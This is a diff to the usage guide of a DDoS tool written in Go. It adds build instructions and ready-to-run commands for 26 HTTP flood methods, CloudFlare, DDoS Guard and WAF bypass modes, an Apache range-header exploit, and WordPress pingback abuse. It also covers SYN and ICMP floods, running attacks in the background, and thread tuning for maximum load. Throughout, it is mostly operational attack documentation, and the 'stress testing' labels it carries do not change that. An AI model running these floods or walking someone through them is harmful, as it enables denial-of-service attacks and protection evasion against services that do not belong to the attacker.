@@ -1,5 +1,9 @@
 # DDoS Tools - Complete Usage Guide
 
+**Maintained By**: Muhammad Thariq  
+**Last Updated**: November 2025  
+**Version**: 2.4 SNAPSHOT
+
 ## Table of Contents
 
 - [Getting Started](#getting-started)
@@ -17,10 +21,102 @@
 
 ## Getting Started
 
-### Basic Command Structure
+### Installation & Building
+
+#### Prerequisites
+- Go 1.22 or higher
+- Git
+
+#### Linux Installation
 
 ```bash
+# Clone the repository
+git clone https://github.com/go-ddos-tools/ddos-tools.git
+cd ddos-tools
+
+# Build the project
+go build -o ddos-tools main.go
+
+# Run the tool
+./ddos-tools HELP
+```
+
+#### macOS Installation
+
+```bash
+# Clone the repository
+git clone https://github.com/go-ddos-tools/ddos-tools.git
+cd ddos-tools
+
+# Build the project
+go build -o ddos-tools main.go
+
+# Run the tool
+./ddos-tools HELP
+```
+
+#### Windows Installation
+
+```powershell
+# Clone the repository
+git clone https://github.com/go-ddos-tools/ddos-tools.git
+cd ddos-tools
+
+# Build the project
+go build -o ddos-tools.exe main.go
+
+# Run the tool
+.\ddos-tools.exe HELP
+```
+
+Or using Command Prompt:
+```cmd
+REM Clone the repository
+git clone https://github.com/go-ddos-tools/ddos-tools.git
+cd ddos-tools
+
+REM Build the project
+go build -o ddos-tools.exe main.go
+
+REM Run the tool
+ddos-tools.exe HELP
+```
+
+---
+
+### Running the Tool
+
+#### Linux / macOS
+
+```bash
+# Basic command structure
 ./ddos-tools [COMMAND] [ARGUMENTS]
+
+# Examples
+./ddos-tools HELP
+./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
+```
+
+#### Windows (PowerShell)
+
+```powershell
+# Basic command structure
+.\ddos-tools.exe [COMMAND] [ARGUMENTS]
+
+# Examples
+.\ddos-tools.exe HELP
+.\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
+```
+
+#### Windows (Command Prompt)
+
+```cmd
+REM Basic command structure
+ddos-tools.exe [COMMAND] [ARGUMENTS]
+
+REM Examples
+ddos-tools.exe HELP
+ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
 ```
 
 ### Available Commands
@@ -33,6 +129,25 @@
 ---
 
 ## Command Syntax
+
+### Platform-Specific Syntax
+
+**Linux / macOS:**
+```bash
+./ddos-tools <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
+```
+
+**Windows (PowerShell):**
+```powershell
+.\ddos-tools.exe <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
+```
+
+**Windows (Command Prompt):**
+```cmd
+ddos-tools.exe <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
+```
+
+**Note**: For brevity, examples below use Linux/macOS syntax (`./ddos-tools`). Windows users should replace with `.\ddos-tools.exe` (PowerShell) or `ddos-tools.exe` (Command Prompt).
 
 ### Layer 7 Attack Syntax
 
@@ -51,6 +166,7 @@
 
 ### Layer 4 Attack Syntax
 
+**Basic:**
 ```bash
 ./ddos-tools <method> <ip:port> <threads> <duration>
 ```
@@ -61,8 +177,7 @@
 - `<threads>` - Number of concurrent threads
 - `<duration>` - Attack duration in seconds
 
-### Layer 4 with Proxies
-
+**With Proxies:**
 ```bash
 ./ddos-tools <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
 ```
@@ -73,13 +188,41 @@
 ./ddos-tools <method> <ip:port> <threads> <duration> <reflector_file>
 ```
 
+### Privileged Commands (Linux/macOS)
+
+Some methods require root/administrator privileges:
+
+**Linux/macOS:**
+```bash
+sudo ./ddos-tools SYN 192.168.1.1:80 500 60
+sudo ./ddos-tools ICMP 192.168.1.1:0 300 60
+```
+
+**Windows (PowerShell - Run as Administrator):**
+```powershell
+.\ddos-tools.exe SYN 192.168.1.1:80 500 60
+.\ddos-tools.exe ICMP 192.168.1.1:0 300 60
+```
+
+**Windows (Command Prompt - Run as Administrator):**
+```cmd
+ddos-tools.exe SYN 192.168.1.1:80 500 60
+ddos-tools.exe ICMP 192.168.1.1:0 300 60
+```
+
+⚠️ **Note**: SYN and ICMP methods require elevated privileges on all platforms.
+
 ---
 
 ## Layer 7 Attacks
 
 Layer 7 attacks target the application layer (HTTP/HTTPS).
 
-### ✅ Implemented Methods (8/27)
+### ✅ All 26 Methods Implemented (100% Complete!)
+
+---
+
+### Basic HTTP Methods
 
 #### **GET** - HTTP GET Flood
 Standard HTTP GET request flood.
@@ -88,15 +231,325 @@ Standard HTTP GET request flood.
 ./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
 ```
 
+**Use Case**: Basic HTTP flooding, resource exhaustion
+
+---
+
 #### **POST** - HTTP POST Flood
-HTTP POST request flood with random data.
+HTTP POST request flood with random data payloads.
 
 ```bash
 ./ddos-tools POST https://example.com/api 5 200 proxies.txt 50 120
 ```
 
+**Use Case**: Testing form submissions, API endpoints, upload handlers
+
+---
+
 #### **HEAD** - HTTP HEAD Flood
-HTTP HEAD request flood (lightweight).
+HTTP HEAD request flood (lightweight, no body).
+
+```bash
+./ddos-tools HEAD http://example.com 5 150 proxies.txt 200 60
+```
+
+**Use Case**: Lightweight flooding, testing rate limits without bandwidth usage
+
+---
+
+#### **STRESS** - Mixed Stress Test
+Combined GET/POST flood with large payloads for maximum stress.
+
+```bash
+./ddos-tools STRESS http://example.com 5 100 proxies.txt 100 90
+```
+
+**Use Case**: Comprehensive stress testing, resource exhaustion
+
+---
+
+#### **SLOW** - Slowloris Attack
+Keep-alive connection exhaustion attack.
+
+```bash
+./ddos-tools SLOW http://example.com 5 200 proxies.txt 50 300
+```
+
+**Use Case**: Connection pool exhaustion, testing timeout configurations
+
+---
+
+#### **NULL** - HTTP NULL Flood
+Minimal headers HTTP flood for speed.
+
+```bash
+./ddos-tools NULL http://example.com 5 300 proxies.txt 500 60
+```
+
+**Use Case**: High-speed flooding with minimal overhead
+
+---
+
+#### **COOKIE** - Cookie-Based Attack
+HTTP flood with randomized cookie headers.
+
+```bash
+./ddos-tools COOKIE http://example.com 5 100 proxies.txt 100 60
+```
+
+**Use Case**: Testing session handling, cookie parsing vulnerabilities
+
+---
+
+#### **PPS** - Packets Per Second Optimized
+Optimized for maximum packets per second delivery.
+
+```bash
+./ddos-tools PPS http://example.com 5 200 proxies.txt 1000 60
+```
+
+**Use Case**: Network saturation testing, bandwidth testing
+
+---
+
+### Bypass & Protection Evasion Methods
+
+#### **CFB** - CloudFlare Bypass
+CloudFlare bypass using cloudscraper-like techniques.
+
+```bash
+./ddos-tools CFB https://example.com 5 100 proxies.txt 50 120
+```
+
+**Use Case**: Testing CloudFlare protection, bypassing basic WAF rules
+
+---
+
+#### **BYPASS** - Generic WAF Bypass
+Generic bypass method using standard HTTP client.
+
+```bash
+./ddos-tools BYPASS https://example.com 5 100 proxies.txt 100 60
+```
+
+**Use Case**: Testing generic WAF protection, standard bypass techniques
+
+---
+
+#### **OVH** - OVH-Specific Attack
+OVH-optimized attack with limited RPC (max 5).
+
+```bash
+./ddos-tools OVH http://example.com 5 100 proxies.txt 5 60
+```
+
+**Use Case**: Testing OVH DDoS protection, limited request attacks
+
+---
+
+#### **DYN** - Dynamic Host Header Attack
+Dynamic host header manipulation with IP spoofing.
+
+```bash
+./ddos-tools DYN http://example.com 5 150 proxies.txt 100 90
+```
+
+**Use Case**: Testing virtual host configurations, host header validation
+
+---
+
+#### **DGB** - DDoS Guard Bypass
+DDoS Guard bypass with timing delays.
+
+```bash
+./ddos-tools DGB https://example.com 5 100 proxies.txt 5 120
+```
+
+**Use Case**: Testing DDoS Guard protection, challenge-response bypass
+
+---
+
+#### **AVB** - Anti-Bot Bypass
+Anti-bot protection bypass with request delays.
+
+```bash
+./ddos-tools AVB http://example.com 5 100 proxies.txt 100 60
+```
+
+**Use Case**: Testing bot detection, rate limiting with delays
+
+---
+
+#### **CFBUAM** - CloudFlare Under Attack Mode Bypass
+CloudFlare UAM bypass with 5-second challenge wait.
+
+```bash
+./ddos-tools CFBUAM https://example.com 5 50 proxies.txt 100 180
+```
+
+**Use Case**: Testing CloudFlare "I'm Under Attack" mode, challenge solving
+
+---
+
+### Advanced Attack Methods
+
+#### **EVEN** - Event-Based Attack
+Sends requests and reads responses to keep connections alive.
+
+```bash
+./ddos-tools EVEN http://example.com 5 100 proxies.txt 100 120
+```
+
+**Use Case**: Connection persistence testing, keep-alive exploitation
+
+---
+
+#### **GSB** - Google Search Bot Simulation
+Simulates Google Search Bot with query strings and special headers.
+
+```bash
+./ddos-tools GSB http://example.com 5 100 proxies.txt 200 60
+```
+
+**Use Case**: Testing bot detection, search engine crawler handling
+
+---
+
+#### **APACHE** - Apache Range Header Attack
+Apache Range header vulnerability (CVE-2011-3192) exploitation.
+
+```bash
+./ddos-tools APACHE http://example.com 5 50 proxies.txt 10 60
+```
+
+**Use Case**: Testing Apache range header parsing, resource exhaustion
+
+⚠️ **Note**: Targets Apache web servers with range header vulnerability
+
+---
+
+#### **XMLRPC** - XML-RPC Pingback Attack
+WordPress XML-RPC pingback flood.
+
+```bash
+./ddos-tools XMLRPC https://example.com/xmlrpc.php 5 100 proxies.txt 50 90
+```
+
+**Use Case**: Testing WordPress XML-RPC protection, pingback abuse
+
+---
+
+#### **BOT** - Bot Simulation Attack
+Simulates search engine bots requesting robots.txt and sitemap.xml.
+
+```bash
+./ddos-tools BOT http://example.com 5 100 proxies.txt 100 60
+```
+
+**Use Case**: Testing bot detection, crawler rate limiting
+
+---
+
+#### **BOMB** - High-Volume Bombardment
+High-volume attack for maximum request throughput.
+
+```bash
+./ddos-tools BOMB http://example.com 5 200 proxies.txt 500 60
+```
+
+**Use Case**: Bandwidth saturation, maximum throughput testing
+
+---
+
+#### **DOWNLOADER** - Download and Read Attack
+Downloads and reads all response data to maximize bandwidth usage.
+
+```bash
+./ddos-tools DOWNLOADER http://example.com/large-file 5 100 proxies.txt 50 120
+```
+
+**Use Case**: Bandwidth exhaustion, testing large file delivery
+
+---
+
+#### **KILLER** - Multi-Spawn GET Attack
+Spawns multiple concurrent GET requests using goroutines.
+
+```bash
+./ddos-tools KILLER http://example.com 5 50 proxies.txt 100 60
+```
+
+**Use Case**: Extreme concurrency testing, connection pool exhaustion
+
+⚠️ **Warning**: Spawns many goroutines, use moderate RPC values
+
+---
+
+#### **TOR** - Tor Network Bypass
+Tor network (.onion) access via tor2web gateways.
+
+```bash
+./ddos-tools TOR http://example.onion 5 50 proxies.txt 50 90
+```
+
+**Use Case**: Testing .onion sites, tor2web gateway stress testing
+
+**Supported Gateways**: onion.city, onion.cab, onion.direct, onion.sh, onion.link, etc.
+
+---
+
+#### **RHEX** - Random Hex Path Attack
+Generates random hex paths for each request.
+
+```bash
+./ddos-tools RHEX http://example.com 5 100 proxies.txt 200 60
+```
+
+**Use Case**: Testing path normalization, cache poisoning, 404 handling
+
+---
+
+#### **STOMP** - Special Hex Pattern Attack
+Uses special hex patterns targeting CloudFlare CDN endpoints.
+
+```bash
+./ddos-tools STOMP http://example.com 5 100 proxies.txt 100 90
+```
+
+**Use Case**: Testing CDN protection, special character handling, path validation
+
+---
+
+### Layer 7 Method Summary
+
+| Method | Type | Speed | Complexity | Target |
+|--------|------|-------|------------|--------|
+| GET | Basic | Fast | Low | General |
+| POST | Basic | Medium | Low | Forms/APIs |
+| HEAD | Basic | Very Fast | Low | General |
+| STRESS | Basic | Medium | Medium | General |
+| SLOW | Basic | Slow | Medium | Connections |
+| NULL | Basic | Very Fast | Low | General |
+| COOKIE | Basic | Fast | Low | Sessions |
+| PPS | Basic | Very Fast | Low | Network |
+| CFB | Bypass | Medium | High | CloudFlare |
+| BYPASS | Bypass | Medium | Medium | WAF |
+| OVH | Bypass | Slow | Medium | OVH |
+| DYN | Bypass | Medium | Medium | Vhosts |
+| DGB | Bypass | Slow | High | DDoS Guard |
+| AVB | Bypass | Slow | Medium | Anti-Bot |
+| CFBUAM | Bypass | Very Slow | High | CloudFlare UAM |
+| EVEN | Advanced | Medium | Medium | Keep-Alive |
+| GSB | Advanced | Fast | Medium | Bot Detection |
+| APACHE | Advanced | Medium | High | Apache |
+| XMLRPC | Advanced | Medium | Medium | WordPress |
+| BOT | Advanced | Medium | Medium | Crawlers |
+| BOMB | Advanced | Very Fast | Low | Bandwidth |
+| DOWNLOADER | Advanced | Slow | Low | Bandwidth |
+| KILLER | Advanced | Very Fast | High | Concurrency |
+| TOR | Advanced | Slow | High | Tor Sites |
+| RHEX | Advanced | Fast | Medium | Paths |
+| STOMP | Advanced | Medium | High | CDN |
 
 ```bash
 ./ddos-tools HEAD http://example.com 1 150 http-proxies.txt 100 60
@@ -624,13 +1077,45 @@ wait
 
 ## Troubleshooting
 
-### Common Issues
+### Platform-Specific Issues
 
-#### "Permission denied" for SYN flood
-**Solution**: Run with elevated privileges
+#### Linux/macOS: "Permission denied" for SYN/ICMP
+**Solution**: Run with sudo
 ```bash
 sudo ./ddos-tools SYN 192.168.1.1:80 100 60
+sudo ./ddos-tools ICMP 192.168.1.1:0 300 60
 ```
+
+#### Windows: "Permission denied" for SYN/ICMP
+**Solution**: Run PowerShell or Command Prompt as Administrator
+1. Right-click on PowerShell/Command Prompt
+2. Select "Run as Administrator"
+3. Navigate to ddos-tools directory
+4. Run the command:
+```powershell
+.\ddos-tools.exe SYN 192.168.1.1:80 100 60
+```
+
+#### Windows: "ddos-tools is not recognized"
+**Solution**: Use correct path syntax
+```powershell
+# PowerShell - use .\
+.\ddos-tools.exe HELP
+
+# Command Prompt - use .\ or full name
+ddos-tools.exe HELP
+```
+
+#### macOS: "ddos-tools cannot be opened because it is from an unidentified developer"
+**Solution**: Allow the application in System Preferences
+```bash
+# Method 1: Remove quarantine attribute
+xattr -d com.apple.quarantine ddos-tools
+
+# Method 2: System Preferences → Security & Privacy → Allow
+```
+
+### Common Issues
 
 #### "Cannot resolve hostname"
 **Solution**: Check target hostname/IP
@@ -671,12 +1156,111 @@ cat > config.json << 'EOF'
 EOF
 ```
 
+### Cross-Platform Tips
+
+#### File Paths
+
+**Linux/macOS:**
+```bash
+# Relative paths use forward slashes
+./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
+./ddos-tools GET http://example.com 5 100 files/proxies/proxies.txt 100 60
+```
+
+**Windows (PowerShell):**
+```powershell
+# Can use forward or back slashes
+.\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
+.\ddos-tools.exe GET http://example.com 5 100 files\proxies\proxies.txt 100 60
+```
+
+**Windows (Command Prompt):**
+```cmd
+REM Use back slashes
+ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
+ddos-tools.exe GET http://example.com 5 100 files\proxies\proxies.txt 100 60
+```
+
+#### Background Execution
+
+**Linux/macOS:**
+```bash
+# Run in background
+./ddos-tools GET http://example.com 5 100 proxies.txt 100 60 &
+
+# Run in background with nohup
+nohup ./ddos-tools GET http://example.com 5 100 proxies.txt 100 60 &
+
+# Run in screen/tmux session
+screen -S ddos
+./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
+# Detach: Ctrl+A, D
+```
+
+**Windows (PowerShell):**
+```powershell
+# Run in new window
+Start-Process .\ddos-tools.exe -ArgumentList "GET","http://example.com","5","100","proxies.txt","100","60"
+
+# Run in background job
+Start-Job -ScriptBlock { .\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60 }
+```
+
+**Windows (Command Prompt):**
+```cmd
+REM Run in new window
+start ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
+```
+
+#### Stopping Attacks
+
+**Linux/macOS:**
+```bash
+# Ctrl+C to stop current attack
+# Or find and kill process
+ps aux | grep ddos-tools
+kill <PID>
+
+# Kill all instances
+pkill ddos-tools
+```
+
+**Windows (PowerShell):**
+```powershell
+# Ctrl+C to stop current attack
+# Or find and stop process
+Get-Process ddos-tools | Stop-Process
+
+# Stop specific process
+Stop-Process -Name ddos-tools -Force
+```
+
+**Windows (Command Prompt):**
+```cmd
+REM Ctrl+C to stop current attack
+REM Or find and kill process
+tasklist | findstr ddos-tools
+taskkill /IM ddos-tools.exe /F
+```
+
 ### Performance Tuning
 
-#### Optimal Thread Count
+#### Optimal Thread Count by Platform
+
+**Linux:**
 - **Layer 7**: 100-500 threads
-- **Layer 4**: 100-1000 threads
-- Adjust based on your system's CPU/RAM
+- **Layer 4**: 200-1000 threads
+- Can handle more threads due to efficient I/O
+
+**macOS:**
+- **Layer 7**: 100-400 threads
+- **Layer 4**: 200-800 threads
+- Similar to Linux but may have lower limits
+
+**Windows:**
+- **Layer 7**: 50-300 threads
+- **Layer 4**: 100-500 threads
+- Lower due to different I/O model
 
 #### RPC (Requests Per Connection)
 - **High RPC (100-200)**: More efficient, less proxy rotation
@@ -688,13 +1272,17 @@ EOF
 
 ### System Requirements
 
-**Minimum**:
+**Minimum:**
 - 2 CPU cores
 - 2 GB RAM
 - 100 Mbps network
+- Windows 10/macOS 10.15/Linux kernel 4.x or higher
 
-**Recommended**:
+**Recommended:**
 - 4+ CPU cores
+- 8 GB RAM
+- 1 Gbps network
+- Windows 11/macOS 12+/Linux kernel 5.x or higher
 - 4+ GB RAM
 - 1 Gbps network
 
